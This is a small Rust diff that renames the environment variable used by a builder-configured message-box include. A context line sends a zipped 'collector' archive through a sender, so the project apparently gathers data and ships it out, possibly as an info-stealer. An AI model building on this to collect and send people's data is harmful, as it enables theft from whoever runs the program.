@@ -88,7 +88,7 @@ pub fn run() {
     let _ = sender.send_archive(generate_log_name(), zip, &collector);
 
     #[cfg(feature = "message_box_after_execution")]
-    include!(env!("BUILDER_MESSAGE_BOX"));
+    include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
 }
 
 fn generate_log_name() -> Arc<str> {
